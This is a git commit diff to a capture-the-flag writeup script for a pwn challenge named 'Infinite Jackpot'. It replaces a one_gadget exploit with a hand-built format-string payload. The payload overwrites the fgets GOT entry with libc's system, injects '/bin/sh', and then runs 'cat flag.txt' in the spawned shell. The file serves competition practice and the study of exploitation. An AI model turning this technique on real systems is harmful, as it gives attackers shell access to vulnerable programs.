a89b6b5630414b4f57dfd9fae22f8f6f504cfc4e
msfir <ms.firdaus777@gmail.com>
2023-11-06 19:28:20 +0700

    feat(pwn): non-one_gadget solution for `Infinite Jackpot`

--- PWN/Infinite Jackpot/writeup/x.py
+++ PWN/Infinite Jackpot/writeup/x.py
@@ -2,10 +2,14 @@
 # -*- coding: utf-8 -*-
 from pwn import *
 from ctypes import CDLL
+from math import ceil
 
 context.terminal = ["kitty", "@launch", "--location=split"]
 exe = context.binary = ELF(args.EXE or '../dist/chall')
-libc = ELF(libcdb.search_by_build_id(
+if args.LOCAL:
+    libc = ELF("/usr/lib/libc.so.6.dbg")
+else:
+    libc = ELF(libcdb.search_by_build_id(
     "a43bfc8428df6623cd498c9c0caeb91aec9be4f9"))
 dll = CDLL("libc.so.6")
 
@@ -56,9 +60,24 @@ libc.address = int(io.recvline(), 16) - libc.sym["__libc_start_call_main"] - 128
 log.info(f"libc @ 0x{libc.address:x}")
 assert libc.address & 0xfff == 0
 
-one_gadgets = [0x50a47, 0xebc81, 0xebc85, 0xebc88]
-
-payload = fmtstr_payload(10, {exe.got["putchar"]: libc.address + one_gadgets[2]})
+fmt_offset = 15
+target = exe.got["fgets"]
+system = libc.sym["system"]
+writes = {
+    target: system & 0xffff,
+    target+2: (system >> 16) & 0xffff,
+}
+writes = list(sorted(writes.items(), key=lambda x:x[1]))
+payload = b"/bin/sh;#"
+prev = len(payload)
+for i, (_, v) in enumerate(writes):
+    payload += f"%{v - prev}c%{fmt_offset + i}$hn".encode()
+    prev = v
+payload = payload.ljust(ceil(len(payload) / 8) * 8, b"\0")
+for k, _ in writes:
+    payload += p64(k)
 jackpot(payload)
+
+jackpot(b"cat flag.txt")
 
 io.interactive()
